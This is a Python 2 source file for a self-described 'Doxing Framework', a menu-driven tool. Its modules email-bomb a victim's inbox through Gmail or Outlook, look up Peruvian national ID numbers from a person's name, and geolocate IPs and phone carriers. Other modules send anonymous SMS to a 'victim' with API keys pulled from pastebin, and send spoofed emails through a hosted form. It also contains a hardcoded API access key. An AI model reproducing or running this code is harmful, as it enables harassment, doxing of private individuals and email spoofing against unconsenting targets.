#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import platform

if platform.python_version()[0] == '2':
    pass
else:
    print("You need the version 2.7.X of Python")
    exit(1)

#######################################
#                                     #
#           Doxing Framework          #
#                                     #
#  Tool made by: Sempatte             #
#  Date: 18 June, 2018                #
#  Version: 1.3                       #
#  Link: www.fuck-society.com         #
#                                     #
#######################################


import sys, os, getpass, smtplib, time, json, signal, webbrowser, argparse
from libs.colors import *


def ClearS():
    if os.name == "nt":
        os.system("cls")
    elif os.name == "posix":
        os.system("clear")
    else:
        pass


from libs.modules import CheckM, pprint
from libs.modules import DeleteCache
from libs.modules import ctrl_c
from libs.modules import Update



signal.signal(signal.SIGINT, ctrl_c)

ClearS()

# posix: Linux
# nt: Windows

parser = argparse.ArgumentParser()
parser.add_argument("-d", "--developer", help="Developer executes as way", action="store_true")
args = parser.parse_args()


from io import *

# noinspection PyBroadException

from libs.view import *


if args.developer:
    # noinspection PyUnresolvedReferences
    import pip, pycurl, urllib, lxml, requests, request
    from urllib2 import urlopen
    from bs4 import BeautifulSoup

else:
    print Yellow + "\n [!]::[Check Dependencies]: \n"


    def connected(host='http://google.com'):
        # noinspection PyBroadException
        try:
            urlopen(host)
            return True
        except:
            return False

    if connected():
        openipv4 = urlopen('http://ipv4.wtfismyip.com/text')
        ip = openipv4.read()
        op_sys = sys.platform.replace('win32', 'Windows').replace('cygwin', 'Windows')

        if os.name == 'nt':
            check = "Y"
        elif os.name == 'posix':
            check = "✓"

        print ' [' + Green + check + Yellow + ']::[Connectivity to Internet]:' + Green + ' YES!' + Yellow
        print ' [' + Green + check + Yellow + ']::[DISTRO/O.S]: ' + Green + op_sys + Yellow

    else:
        if os.name == 'nt':
            _no = "N"
        elif os.name == 'posix':
            _no = "✘"

        print ' [' + Red + _no + Yellow + ']::[Connectivity to Internet]:' + Red + ' NO!' + Yellow
        print Red + "\n [!] Please check your Internet Connectivity. " + White
        exit(1)

    # noinspection PyBroadException
    try:
        import pip
        pprint(Module_E="pip")
        time.sleep(1)
    except:
        pass

    try:
        import pycurl
        pprint(Module_E="pycurl")
        time.sleep(1)
    except ImportError:
        CheckM(Module="pycurl")


    try:
        import urllib
        pprint(Module_E="urllib")
        time.sleep(1)
    except ImportError:
        CheckM(Module="urllib")

    try:

        from urllib2 import urlopen
        pprint(Module_E="urllib2")
        time.sleep(1)
    except ImportError:
        CheckM(Module="urllib2")

    try:
        import lxml
        pprint(Module_E="lxml")
        time.sleep(1)
    except ImportError:
        CheckM(Module="lxml")

    try:
        from bs4 import BeautifulSoup
        pprint(Module_E="bs4")
        time.sleep(1)
    except ImportError:
        CheckM(Module="bs4")

    try:
        import requests
        pprint(Module_E="requests")
        time.sleep(1)
    except ImportError:
        CheckM(Module="requests")

    try:
        import request
        pprint(Module_E="request")
        time.sleep(1)
    except ImportError:
        CheckM(Module="request")


    time.sleep(2)
    ClearS()

    if os.name == "nt":
        os.system('color f')
        print White
    else:
        pass

Banner()
Menu()
Help()

##############################  D        F         M  ###################################
dfm = Yellow + '[' + Red + 'd' + White + 'f' + Red + 'm' + Yellow + ']' + White + ': '
#########################################################################################


while True:
    print White
    choice = raw_input(dfm)
    print White
    choice = choice.lower()

    u = 'use '
    O_1 = u+'pys/email_bomb' #Opcion uno (Email bomb)
    O_2 = u+'dox/find_dni'   #Opcion dos (Find dni)
    O_3 = u+'dox/found_op'   #Opcion tres (Found carrier)
    O_4 = u+'dox/whois'      #Opcion cuatro (WHOIS IP)
    O_5 = u+'dox/ve_email'   #Opcion cinco (Verifica el eMail si existe)
    O_6 = u+'pys/send_sms'   #Opcion seis (Enviar mensajes SMS)
    O_7 = u+'pys/fake_email' #Opcion siete (Enviar correo fake)

    if choice == O_1:
        print Purple + "\n[#] Use" + Red +' back ' + Purple + "to back to menu."
        print White
        server = raw_input("[+] Mail server: Gmail o Hotmail/Outlook: ")
        server = server.lower()


        if server == 'outlook':
            server = 'hotmail'
        #Permitir1
        print Green
        advr = "\n[!] in order to use the '{}' mailserver correctly you must allow access\n\n".format(server)
        if server == 'gmail':
            print advr
            print "Forum: https://support.google.com/a/answer/6260879?hl=es"
            print "Direct link: https://myaccount.google.com/u/0/security?hl=es#connectedapps\n"
            webbrowser.open_new("https://myaccount.google.com/u/0/security?hl=es#connectedapps")
            print Yellow + "[SWITCH] To allow the access of sure applications: " + Red + "YES"
            pass
        elif server == 'hotmail':
            print advr
            print "Direct link: https://outlook.live.com/owa/?path=/options/popandimap\n"
            webbrowser.open_new("https://outlook.live.com/owa/?path=/options/popandimap")
            print Yellow + "[SWITCH] To allow that the devices and the applications should use POP: " + Red + "YES"
            print Yellow + "[SWITCH] It is possible to establish that the devices and the applications that they use POP eliminate Outlook's messages after unloading them. " + Red + "YES"
            pass
        elif server == 'back':
            continue
        elif server == '':
            continue
        else:
            print "[!] Select a correct server.\n"
            continue

        print White
        #Correo atacante
        M_FTA = "Mail from the attacker: "
        user = str(raw_input('[+] '+ M_FTA))

        confirm = raw_input('\n[?] Confirm? Y/N: ')
        confirm = confirm.lower()

        if confirm == 'N':
            user = str(raw_input('\n[REPET] ' + M_FTA))
        else:
            pass


        cda = '\n[SET] ' + M_FTA + '{}'.format(user)
        print Green + cda
        print White
        password = getpass.getpass('[+] Attacker password: ')

        #Correo victima
        to = raw_input('\n[+] Victima: ')
        vct = "[SET] Victim's Mail: {}".format(to)

        C = '\n[?] Confirm? Y/N: '
        confirm_two = raw_input(C)
        print White
        confirm_two = confirm_two.lower()

        if confirm_two == 'N':
            vct = str(raw_input("\n[REPET] Victim's Mail: "))
        else:
            print Green + vct



        #Mensaje
        print White
        body = raw_input('[+] Message to send: ')

        #Nº
        try:
            numero = int(raw_input('\n[+] Number of times to send:'))
        except ValueError:
            print "[!] Please place only numbers"
            continue
        nmr = '\n[SET] N: {}'.format(numero)

        print Green + nmr

        #Confirmar proceso
        print Red
        cfr_dos = raw_input("n[?] Are you sure you want to continue? Y/N: ")
        print White
        if cfr_dos == 'N':
            continue
        else:
            pass


        if server == 'gmail':
            smtp_server = 'smtp.gmail.com'
            port = 587
        elif server == 'hotmail':
            smtp_server = 'smtp-mail.outlook.com'
            port = 587
        else:
            print '[-] Mail server wrong, try again.'
            continue

        try:

            server = smtplib.SMTP(smtp_server,port)
            server.ehlo()
            if smtp_server == 'smtp.gmail.com':
                server.starttls()
            elif smtp_server == 'smtp-mail.outlook.com':
                server.starttls()

            server.login(user,password)


            for i in range(1, numero+1):
                subject = os.urandom(9)

                server.sendmail(user,to,body)
                sends = "\rE-mails sent: [%i]" % i
                print sends
                sys.stdout.flush()
            server.quit()
            print "\n[!] Done with success!\n"
        except KeyboardInterrupt:
            print "[Ctrl+C] Canceled by user."
            exit(1)
        except smtplib.SMTPAuthenticationError:
            print '\n[!] The user/email or password introduced from the attacker are wrong. Try it again.'
            continue
        except smtplib.SMTPServerDisconnected:
            print '\n[!] The server was disconnected by an unknown error. Try it again.'
            continue
        except smtplib.SMTPConnectError:
            print '\n[!] An Error occurred while trying to connect to the server. Check your connection.'
            continue

    elif choice == O_2:

        print Purple + "\n[#] Use" + Red + ' back ' + Purple + "to back to menu."

        print White
        print Yellow

        ape_pat = raw_input('\n[+] Insert the paternal surname: ')
        ape_pat = ape_pat.upper()

        if ape_pat == 'back':
            continue

        ape_mat = raw_input('\n[+] Insert the maternal surname: ')
        ape_mat = ape_mat.upper()

        _names = raw_input('\n[+] Insert the names: ')
        _names = _names.upper()


        user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36'
        sess = requests.Session()
        email_req = sess.post('http://dniperu.online/buscador/buscardni_1.php', headers={
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://dniperu.online/buscador/buscardni_1.php',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'dniperu.online',
            'Origin': 'http://dniperu.online'
        }, data={
            'APE_PAT': ape_pat,
            'APE_MAT': ape_mat,
            'NOMBRES': _names
        })

        i = email_req.text
        j = open('dni_dat.html', 'w')
        j.write(i)

        j.close()

        f = open('dni_dat.html','r')
        datos_dni = f.read()


        names = ape_pat + ' ' + ape_mat + ' ' + _names

        soup = BeautifulSoup(datos_dni, 'lxml')

        ############# PRINT ##############

        #NOMBRES
        print Green + '\n[#]Names: '
        print Cyan + '       ' + names
        #DNI


        dni_f = str(soup.find("td", attrs={'style': 'width:80%;'}))

        dni = dni_f.replace('A', '').replace('B', '').replace('C', '').replace('D', '').replace('E', '')
        dni = dni.replace('F', '').replace('G', '').replace('H', '').replace('I', '').replace('J', '')
        dni = dni.replace('K', '').replace('L', '').replace('M', '').replace('N', '').replace('Ñ', '').replace('O', '')
        dni = dni.replace('P', '').replace('Q', '').replace('R', '').replace('S', '').replace('T', '')
        dni = dni.replace('U', '').replace('V', '').replace('W', '').replace('X', '').replace('Y', '')
        dni = dni.replace('Z', '').replace('<td style="width:80%;"><b>', '').replace('</b> </td>', '').replace(chr(194), '').replace(chr(160), '').replace(' ', '')


        if dni == 'one': #Not found dni | one = NONE ;)
            print Green + '[#]DNI: '
            print Cyan + '       ' + 'NOT FOUND.'
        else:
            print Green + '[#]DNI: '
            print Cyan + '       ' + dni + '\n'

        f.close()

        if os.name == "nt":
            os.system("del /F /Q dni_dat.html")
        elif os.name == "posix":
            os.system("rm dat_dni.html")
        else:
            pass

    elif choice == O_3:

        print Purple + "\n[~] Leave blank to back the menu."
        print White

        try:
            access_key = '7ffd7b8e4cd47b7f818dc55be7505fd8'
            sys.stdout.write("[#] Insert the prefix and the number: +")
            sys.stdout.flush()
            number = raw_input()

            if number == '':
                continue
            else:
                pass

            url = 'http://apilayer.net/api/validate?access_key={}&number={}&country_code=&format=1.json'.format(access_key, number)

            r = urlopen(url)
            text = r.read()

            f = open(number+'.json','a')
            f.write(text.decode('utf-8'))
            f.close()


            def cargar_datos(rutacon_2):
                with open(rutacon_2) as contenido:
                    number_a = json.load(contenido)
                    A = json.dumps(number_a, indent=4, sort_keys=True).replace('{', '').replace('}', '').replace('"', '').replace('_', ' ').replace(',', '').replace('    ', '[+] ')
                    print Green
                    if 'valid: false' in A:
                        print "[!] Wrong number"
                    elif 'valid: true' in A:
                        print A.upper()
                    elif 'code: 211' or 'success: false' in A:
                        print "[!] Place only numbers"
                    else:
                        print A.upper()

            rutacon = number + ".json"
            cargar_datos(rutacon)


            if os.name == "nt":
                os.system("del /F /Q " + rutacon)
            elif os.name == "posix":
                os.system("rm " + rutacon)
            else:
                pass

        except ValueError :
            if os.name == "nt":
                os.system("del /F /Q " + rutacon)
            elif os.name == "posix":
                os.system("rm " + rutacon)
            else:
                print "Delete the file with extention '.json'"

    elif choice == O_4:

        print Purple
        print "[~] Use" + Red + ' clear ' + Purple + "to clear the console."
        print Purple + "[~] Use" + Red + ' back ' + Purple + "to back to menu."
        print White
        openipv4 = urlopen('http://ipv4.wtfismyip.com/text')
        ip = openipv4.read()

        print 'Your IP: {}'.format(ip)
        __ip = raw_input('[#] Insert IP: ')

        if __ip == 'back': continue
        else: pass

        url = 'http://extreme-ip-lookup.com/json/{}'.format(__ip)

        # noinspection PyBroadException

        try:
            r = urlopen(url)
            text = r.read()
        except:
            print Red + "\n[!] Invalid IP \n"
            print White
            continue

        f = open(__ip + '.json', 'a')
        f.write(text.decode('utf-8'))
        f.close()


        def cargar_datos_2(ruta_2):

            with open(ruta_2) as contenido:

                w_ip = json.load(contenido)
                A = json.dumps(w_ip, indent=4, sort_keys=True)
                A = A.upper()
                print Green
                Line = '-------------------------------------------------------------------------------------------------------------------------------'
                print Yellow + '\n' + Line
                dates_ip = A.replace('{', '').replace('}', '').replace('"', '').replace('    ', Green + '[+] ' + Yellow).replace('_', ' ').replace(',', '')

                dates_ip = dates_ip.replace('CITY: ', White + 'CITY: ' + Yellow)
                dates_ip = dates_ip.replace('BUSINESSNAME: ', White + 'BUSINESSNAME: ' + Yellow)
                dates_ip = dates_ip.replace('BUSINESSWEBSITE: ', White + 'BUSINESSWEBSITE: ' + Yellow)
                dates_ip = dates_ip.replace('CONTINENT: ', White + 'CONTINENT: ' + Yellow)
                dates_ip = dates_ip.replace('COUNTRY: ', White + 'COUNTRY: ' + Yellow)
                dates_ip = dates_ip.replace('COUNTRYCODE: ', White + 'COUNTRYCODE: ' + Yellow)
                dates_ip = dates_ip.replace('IPNAME: ', White + 'IPNAME: ' + Yellow)
                dates_ip = dates_ip.replace('IPTYPE: ', White + 'IPTYPE: ' + Yellow)
                dates_ip = dates_ip.replace('ISP: ', White + 'ISP: ' + Yellow)
                dates_ip = dates_ip.replace('LAT: ', White + 'LAT: ' + Yellow)
                dates_ip = dates_ip.replace('LON: ', White + 'LON: ' + Yellow)
                dates_ip = dates_ip.replace('ORG: ', White + 'ORG: ' + Yellow)
                dates_ip = dates_ip.replace('QUERY: ', White + 'QUERY: ' + Yellow)
                dates_ip = dates_ip.replace('REGION: ', White + 'REGION: ' + Yellow)
                dates_ip = dates_ip.replace('STATUS: ', White + 'STATUS: ' + Yellow)


                if "QUERY IS NOT A VALID IP ADDRESS" in dates_ip:
                    print Red + "\n[!] Invalid IP \n"
                else:
                    print dates_ip
                    pass

                print Yellow + Line + '\n'

                print White


        try:

            ruta = __ip + ".json"
            cargar_datos_2(ruta)
            if os.name == "nt":
                os.system("del /F /Q " + ruta)
            elif os.name == "posix":
                os.system("rm " + ruta)
            else:
                pass

        except ValueError:
            if os.name == "nt":
                os.system("del /F /Q " + ruta)
            elif os.name == "posix":
                os.system("rm " + ruta)
            else:
                pass

    elif choice == O_5:
        print Purple + "\n\n[~] Leave blank to back the menu."
        print White
        sys.stdout.write("[#] Insert the eMail: ")
        sys.stdout.flush()
        e_Mail = raw_input()

        if '@' in e_Mail:
            pass
        elif e_Mail == '':
            continue
        else:
            print Red + "\n[!] eMail Invalid! " + White
            continue
        url_3 = 'http://api.2ip.me/email.txt?email={}'.format(e_Mail)

        # noinspection PyBroadException
        try:
            OP = urlopen(url_3)
            VW = OP.read()
            if 'true' in VW:
                print Green + "\n[+] This email " + Yellow + e_Mail + Green + " if it exists\n"
            elif 'false' in VW:
                print Red + "\n[+] This email "  + Yellow + e_Mail + Red + " does not exist\n"
            else:
                print Red + "\n[!] Limit of returned objects has been reached. Please change your IP \n"
        except:
            print Red + '\n[!] Check your internet conectivity'

    elif choice == O_6:

        def sendSMS(API_key_a, API_key_b, API_key_c, victim, message_to):
            url_sms = 'http://api.txtlocal.com/send/?apikey={}&numbers={}&message={}&sender=AAA'.format(API_key_a, victim, message_to)
            openurl = urlopen(url_sms)
            readurl = openurl.read()
            try:
                if "Invalid number" in readurl:
                    print "\n[!] Invalid number"

                elif "Insufficient credits" in readurl or "Invalid login details" in readurl:
                    url_b = 'http://api.txtlocal.com/send/?apikey={}&numbers={}&message={}&sender=AAA'.format(API_key_b, victim, message_to)
                    openurl_b = urlopen(url_b)
                    readurl_b = openurl_b.read()
                    if "Insufficient credits" in readurl_b or "Invalid login details" in readurl_b:
                        url_c = 'http://api.txtlocal.com/send/?apikey={}&numbers={}&message={}&sender=AAA'.format(API_key_c, victim, message_to)
                        openurl_c = urlopen(url_c)
                        readurl_c = openurl_c.read()
                        if "Insufficient credits" in readurl_c or "Invalid login details" in readurl_c:
                            print Red + "\n[!] Please contact the depelover: sempatte@protonmail.com"
                        elif "success" in readurl_c:
                            print Green + "\n[A3#] Sended!"
                        else:
                            pass
                    elif "success" in readurl_b:
                        print Green + "\n[A2#] Sended!"
                    else:
                        pass
                elif "success" in readurl:
                    print Green + "\n[A1#] Sended!"
                else:
                    pass
            except UnboundLocalError:
                print Red + "[!] Do not use space in messages"

        print Purple + "\n[~] Use " + Red + "'+'" + Purple + " instead of space" + White + " Ex: Hello+World+:)"
        print Purple + "[~] Use" + Red +' back ' + Purple + "to back to menu. \n"
        print White
        victim_number = raw_input('[+]Insert the number: +')

        if victim_number == 'back':
            continue
        else:
            pass

        message_sms = raw_input('[+]Insert the message: ')

        if message_sms == 'back':
            continue
        else:
            pass

        ######################### 1 ##########################
        openurl_key_1 = urlopen('http://pastebin.com/raw/8q7kEZ8U') #b00tn0001@gmail.com
        key_1 = openurl_key_1.read()

        ######################### 2 ##########################
        openurl_key_2 = urlopen('http://pastebin.com/raw/sEY9mSZ8') #kayzen.srihan@two0aks.com
        key_2 = openurl_key_2.read()

        ######################### 2 ##########################
        openurl_key_3 = urlopen('http://pastebin.com/raw/zRRjPpxQ') #b00t0004@hotmail.com
        key_3 = openurl_key_3.read()

        API_key_1 = key_1
        API_key_2 = key_2
        API_key_3 = key_3

        #Send sms
        sendSMS(API_key_1, API_key_2, API_key_3, victim_number, message_sms)

    elif choice == O_7:

        print Purple + "\n\n[~] Leave blank to back the menu."
        print Purple + "[~] Do not use domains like" + White + " facebook.com, google.com, gmail.com, etc."

        print Green
        from_name = raw_input('[#] From name: ') #Name

        if from_name == '': continue

        from_email = raw_input('[#] From email: ') #From email

        if '@' in from_email or '@' in to:
            pass
        elif from_email == '' or to == '':
            continue
        else:
            print Red + "\n[!] eMail Invalid! " + White
            continue

        to = raw_input('[#] To: ') #To email

        if to == '': continue

        subject = raw_input('[#] Subject: ') #Subjec

        if subject == '': continue

        text = raw_input('[#] Text: ') #Plain text

        if text == '': continue

        user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
        sess = requests.Session()
        email_req = sess.post('https://prevenient-sister.000webhostapp.com/admin.php', headers={
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://prevenient-sister.000webhostapp.com/admin.php',
            'Upgrade-Insecure-Requests':'1',
            'Content-Type':'application/x-www-form-urlencoded'
        }, data={
            'fromname': from_name,
            'fromemail': from_email,
            'toemail': to,
            'subject': subject,
            'textarea': text,
            'Submit': 'Send'
        })

        a = email_req.text

        f = open('dat.html', 'w')

        f.write(a.decode('utf-8'))

        if 'Email sended.' in a:
            print Yellow + "\n[#] Fake email sended."
            print White
        else:
            print Red + "[!] Email not sended."

        f.close()

        if os.name == "nt":
            os.system("del /F /Q dat.html")
        else:
            os.system("rm dat.html")

    elif choice == "exit": DeleteCache()

    elif choice == "update": Update()

    elif choice == "help":
        ClearS()
        Help()

    elif choice == "showm":
        ClearS()
        Menu()
    else: ClearS()
